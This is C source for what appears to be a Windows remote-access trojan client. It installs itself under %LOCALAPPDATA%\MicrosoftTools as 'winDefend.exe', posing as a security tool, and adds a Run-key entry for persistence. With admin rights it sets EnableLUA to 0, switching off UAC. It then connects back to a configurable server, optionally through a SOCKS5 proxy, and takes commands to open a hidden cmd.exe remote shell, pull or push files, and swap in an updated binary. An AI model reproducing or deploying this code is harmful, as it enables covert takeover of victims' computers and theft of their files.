#include "helper.h"

#include <stdio.h>
#include <stdlib.h>

#include "eaSCKTBasicComProtocols.h"

#define MAIN_DIR     "MicrosoftTools"
#define PROGRAM_NAME L"winDefend.exe"

#ifndef DEST_HOST
#define DEST_HOST "127.0.0.1"
#endif

#ifndef DEST_PORT
#define DEST_PORT 1313
#endif

static bool switch_to_new_program;
static wchar_t pathWithName[260 + 1];

static struct in_addr getAddress(const char *hostname);

#ifdef USE_PROXY

static bool negotiateTheProxyServer(EASCKT sckt);

#endif

static bool mainProcessing(EASCKT sckt, char *msg);
static bool connectToCMD(EASCKT sckt);


bool isThePlaceToBe(const char *pathOfProgram)
{
    return NULL != strstr(pathOfProgram, MAIN_DIR);
}

bool isTheSystemInfected(void)
{
    wchar_t path[260 + 1];
    
    (void)snwprintf(path, 
                    sizeof(path), 
                    L"%S\\%s", 
                    _wgetenv(L"LOCALAPPDATA"), 
                    MAIN_DIR);

    DWORD dwAttr = GetFileAttributesW(path);
    
    return (dwAttr != 0xffffffff) && (dwAttr & FILE_ATTRIBUTE_DIRECTORY);
}

const wchar_t *infectTheSystem(void)
{
    HKEY hKey;
    wchar_t path[260 + 1];
    wchar_t pathOfProgram[260 + 1];
    
    (void)snwprintf(path, 
                    sizeof(path), 
                    L"%S\\%s", 
                    _wgetenv(L"LOCALAPPDATA"), 
                    MAIN_DIR);

    (void)CreateDirectoryW(path, NULL);

    (void)GetModuleFileNameW(NULL, pathOfProgram, (DWORD)sizeof(pathWithName));

    (void)snwprintf(pathWithName, 
                    sizeof(pathWithName), 
                    L"%S\\%S", 
                    path,
                    PROGRAM_NAME);

    (void)CopyFileW(pathOfProgram, pathWithName, 0);
    
    if (!RegOpenKeyExW(HKEY_CURRENT_USER, 
                       L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                       0, 
                       KEY_WRITE, 
                       &hKey))
    {
        (void)RegSetValueExW(hKey, 
                             PROGRAM_NAME, 
                             0, 
                             REG_SZ, 
                             (BYTE *)pathWithName, 
                             sizeof(pathWithName));
    }
    
    (void)RegCloseKey(hKey);

    // if the program is started without admin, lnRes will not be ERROR_SUCCESS
    if (!RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
            0, 
            KEY_WRITE, 
            &hKey))
    {
        (void)RegSetValueExW(hKey, 
                             L"EnableLUA", 
                             0, 
                             REG_DWORD, 
                             (BYTE *)&((DWORD){0U}), 
                             sizeof(DWORD));
    }
    
    (void)RegCloseKey(hKey);

    return pathWithName;
}

void startProgram(const wchar_t *programName)
{
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    
    si.cb = sizeof(si);

    (void)CreateProcessW(programName,        // the path
                         NULL,               // Command line
                         NULL,               // Process handle not inheritable
                         NULL,               // Thread handle not inheritable
                         FALSE,              // Set handle inheritance to FALSE
                         CREATE_NEW_CONSOLE, // Opens file in a separate console
                         NULL,               // Use parent's environment block
                         NULL,               // Use parent's starting directory
                         &si,                // Pointer to STARTUPINFO
                         &pi                 // Pointer to PROCESS_INFORMATION
    );
    
    (void)CloseHandle(pi.hProcess);
    (void)CloseHandle(pi.hThread);
}

void connectToBigBrother(void)
{
    for (;;)
    {
        Sleep(1300);

#if USE_PROXY == 1 

        const char *host = "WRITE"; // proxy
        unsigned short port = htons(WRITE); // proxy port 

#else

        const char *host = DEST_HOST;
        unsigned short port = htons(DEST_PORT);

#endif
        LOG("Getting IPv4 Address\n");

        struct in_addr IPv4 = getAddress(host);

        if (INADDR_NONE == IPv4.S_un.S_addr)
        {
            LOG("Dest Host invalid\n");

            continue;
        }

        LOG("Creating Socket\n");

        EASCKT sckt = socket(AF_INET, SOCK_STREAM, 0);

        if (SCKT_ERR == sckt)
        {
            continue;
        }

        LOG("Configuring Socket\n");

        (void)setsockopt(sckt, 
                         SOL_SOCKET, 
                         SO_SNDTIMEO, 
                         (char *)&((DWORD){33000U}), 
                         sizeof(DWORD));
        (void)setsockopt(sckt, 
                         SOL_SOCKET, 
                         SO_RCVTIMEO, 
                         (char *)&((DWORD){33000U}), 
                         sizeof(DWORD));

        struct sockaddr_in sockAddr = {
            .sin_family = AF_INET,
            .sin_addr = IPv4,
            .sin_port = port
        };

        LOG("Connect Server\n");

        while (connect(sckt, 
               (struct sockaddr *)&sockAddr, 
               (EAScktLen){sizeof(sockAddr)}))
        {
            LOG("Connect Fail, Trying again\n");
            
            Sleep(1300);
        }

#ifdef USE_PROXY

        LOG("\t\tNegotiate Proxy\n");

        if (false == negotiateTheProxyServer(sckt))
        {
            LOG("\t\tNegotiate Proxy error\n");

            eaSCKTClose(sckt);

            continue;
        }

#endif

        LOG("Comm Started\n");

        for (;;)
        {
            char text[313 + 1];

            LOG("\t\t\tRecver Text\n");

            if (false == recverText(sckt, text, sizeof(text)))
            {
                LOG("\t\t\tRecver Error!\n");

                break;
            }

            bool loop = mainProcessing(sckt, text);

            if (false == loop)
            {
                LOG("Main Proccessing Error!\n");

                break;
            }
        }

        eaSCKTClose(sckt);

        if (switch_to_new_program)
        {
            wchar_t path[260 + 1];
        
            (void)snwprintf(path, 
                            sizeof(path), 
                            L"%S\\%s\\%S", 
                            _wgetenv(L"LOCALAPPDATA"), 
                            MAIN_DIR,
                            PROGRAM_NAME);
            startProgram(path);

            break;
        }
    }
}

static struct in_addr getAddress(const char *hostname)
{
    struct in_addr IPv4 = { .S_un.S_addr = inet_addr(hostname)};

    if (INADDR_NONE != IPv4.S_un.S_addr)
    {
        return IPv4;
    }

    struct hostent* hostdata = gethostbyname(hostname);

    if (NULL == hostdata)
    {
        LOG("%s: Invalid host\n", __func__);

        return IPv4;
    }

    return *((struct in_addr **)hostdata->h_addr_list)[0];
}

#ifdef USE_PROXY

#include <stdint.h>

static bool negotiateTheProxyServer(EASCKT sckt)
{
    LOG("\t%s: Send First Request to Proxy\n", __func__);

    unsigned char request[260] = {'\x05','\x01', '\x00'};

    if (false == eaSCKTSend(sckt, (char *)request, 3U))
    {
        LOG("\t%s: error request 3 byte\n", __func__);

        return false;
    }

    LOG("\t%s: Recv First Data from Proxy\n", __func__);

    unsigned char response[260];

    if ((false == eaSCKTRecv(sckt, (char *)response, 2U)) ||
        ('\x05' != response[0]) ||
        ('\x00' != response[1]))
    {
        LOG("\t%s: error response 2 byte\n", __func__);

        return false;
    }

    unsigned char size = 10U;
    struct in_addr IPv4 = { .S_un.S_addr = inet_addr(DEST_HOST)};

    if (INADDR_NONE == IPv4.S_un.S_addr)
    {
        LOG("\t%s: HOST\n", __func__);

        request[3] = '\x03';
        request[4] = (unsigned char)strlen(DEST_HOST);
        (void)memcpy(&request[5], DEST_HOST, request[4]);
        *(uint16_t *)&request[5U + request[4]] = htons(DEST_PORT);

        size = 7U + request[4];
    }
    else
    {
        LOG("\t%s: IP\n", __func__);

        request[3] = '\x01';
        *(uint32_t *)&request[4] = (uint32_t)IPv4.S_un.S_addr;
        *(uint16_t *)&request[8] = htons(DEST_PORT);
    }

    LOG("\t%s: Send Request Data to Proxy\n", __func__);
    
    for (int idx = 0; idx < size; idx++)
    {
        LOG("%u ", (unsigned int)request[idx]);
    }

    LOG("\n");

    if (false == eaSCKTSend(sckt, (char *)&request, size))
    {
        LOG("\t%s: error request\n", __func__);

        return false;
    }

    LOG("\t%s: Recv Response Data from Proxy\n", __func__);
    
    if ((false == eaSCKTRecv(sckt, (char *)&response, 5U)) ||
        ('\x05' != response[0]) ||
        ('\x00' != response[1]))
    {
        LOG("\t%s: error response\n", __func__);

        return false;
    }

    if ('\x01' == response[3])
    {
        size = 5U;
    }
    else if ('\x03' == response[3])
    {
        size = response[4] + 2U;
    }
    else if ('\x04' == response[3])
    {
        size = 17U;
    }

    if (false == eaSCKTRecv(sckt, (char *)&response, size))
    {
        LOG("\t%s: error in last response\n", __func__);

        return false;
    }

    IPv4.S_un.S_addr = *(uint32_t *)&response[4];

    LOG("\t%s: IP : %s\n", __func__, inet_ntoa(IPv4));
    LOG("\t%s: Proxy OK\n", __func__);
    
    return true;
}

#endif

static bool mainProcessing(EASCKT sckt, char *text)
{
    if (!strncmp(text, "cmd", 3U))
    {
        if (false == connectToCMD(sckt))
        {
            return false;
        }
    }
    else if (!strncmp(text, "getFile ", 8U))
    {
        if (false == senderFile(sckt, text + 8))
        {
            return false;
        }
    }
    else if (!strncmp(text, "sendFile ", 9U))
    {
        if (false == recverFile(sckt))
        {
            return false;
        }
    }
    else if (!strncmp(text, "update", 6U))
    {
        wchar_t path[260 + 1];
        
        (void)snwprintf(path, 
                        sizeof(path), 
                        L"%S\\%s", 
                        _wgetenv(L"LOCALAPPDATA"), 
                        MAIN_DIR);
        (void)_wchdir(path);

        (void)remove("old.exe");

        (void)MoveFileW(PROGRAM_NAME, L"old.exe");

        if (false == recverFile(sckt))
        {
            (void)MoveFileW(L"old.exe", PROGRAM_NAME);

            return false;
        }

        switch_to_new_program = true;

        return false;
    }

    return true;
}

static bool connectToCMD(EASCKT sckt)
{
    CHAR chBuf[4500 + 1];
    DWORD dwRead, dwWritten;
    SECURITY_ATTRIBUTES saAttr;
    HANDLE hChildStd_IN_Rd = NULL, hChildStd_IN_Wr = NULL;
    HANDLE hChildStd_OUT_Rd = NULL, hChildStd_OUT_Wr = NULL;

    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);

    if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0))
    {
        if (false == senderText(sckt, "_Error_ CreatePipe1"))
        {
            return false;
        }

        return true;
    }

    if (!CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0))
    {
        if (false == senderText(sckt, "_Error_ CreatePipe2"))
        {
            return false;
        }
        
        return true;
    }

    BOOL bSuccess = FALSE;
    STARTUPINFO siStartInfo;
    PROCESS_INFORMATION piProcInfo;

    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdInput = hChildStd_IN_Rd;
    siStartInfo.hStdError = hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    bSuccess = CreateProcessA("C:\\Windows\\System32\\cmd.exe", 
                              NULL,
                              NULL, 
                              NULL, 
                              TRUE,
                              CREATE_NO_WINDOW, // CREATE_NEW_CONSOLE
                              NULL, 
                              NULL, 
                              &siStartInfo, 
                              &piProcInfo);

    if (!bSuccess)
    {
        if (false == senderText(sckt, "_Error_ CreateProcessA"))
        {
            return false;
        }
        
        return true;
    }
    else
    {
        (void)CloseHandle(piProcInfo.hProcess);
        (void)CloseHandle(piProcInfo.hThread);
    }

    bool connection = true;

    for (;;)
    {
        Sleep(500); //TODO: pipe tam dolana kadar beklenmeli
        
        //TODO: pipe buf is bigger than 4101 again read, note: PeekNamedPipe
        bSuccess = ReadFile(hChildStd_OUT_Rd, chBuf, 4500, &dwRead, NULL);

        if (!bSuccess || dwRead == 0)
        {
            (void)WriteFile(hChildStd_IN_Wr, 
                            "exit\n", 
                            strlen("exit\n"), 
                            &dwWritten, 
                            NULL);
            
            if (false == senderText(sckt, "_Error_ WriteFile1"))
            {
                connection = false;
            }

            break;
        }

        chBuf[dwRead] = '\0';

        dwRead = 0U;

        for (DWORD idx = 0; chBuf[idx]; idx++)
        {
            if ('\n' == chBuf[idx])
            {
                dwRead = idx + 1U;

                break;
            }
        }

        senderText(sckt, &chBuf[dwRead]);

        if (false == recverText(sckt, chBuf, sizeof(chBuf)))
        {
            WriteFile(hChildStd_IN_Wr, 
                      "exit\n", 
                      strlen("exit\n"), 
                      &dwWritten, 
                      NULL);

            if (false == senderText(sckt, "_Error_ WriteFile2"))
            {
                connection = false;
            }

            break;
        }
        
        bSuccess = WriteFile(hChildStd_IN_Wr, 
                             chBuf, 
                             strlen(chBuf), 
                             &dwWritten, 
                             NULL);

        if (!bSuccess)
        {
            if (false == senderText(sckt, "_Error_ WriteFile3"))
            {
                connection = false;
            }

            break;
        }

        if (!strcmp(chBuf, "exit\n"))
        {
            break;
        }
    }

    CloseHandle(hChildStd_IN_Wr);
    CloseHandle(hChildStd_OUT_Rd);

    return connection;
}
